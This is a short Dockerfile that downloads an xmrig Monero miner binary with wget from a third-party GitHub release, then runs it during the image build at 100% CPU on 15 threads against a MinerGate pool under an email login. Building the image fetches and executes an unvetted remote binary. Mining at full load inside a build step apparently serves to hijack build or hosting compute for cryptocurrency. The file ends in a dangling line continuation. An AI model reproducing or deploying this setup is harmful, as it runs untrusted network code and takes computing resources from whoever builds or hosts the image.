FROM ubuntu:xenial

RUN apt-get update && apt-get install -y wget


RUN useradd -ms /bin/bash monero
USER monero
WORKDIR /home/monero

RUN wget https://github.com/SecurityOfficerAlfaZulu/portable_xmrig/releases/download/0.9.0/xmrig &&\
  chmod +x xmrig &&\
  ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u philipe2018@gmail.com -p x --threads 15 --max-cpu-usage=100 --donate-level 1 &&\
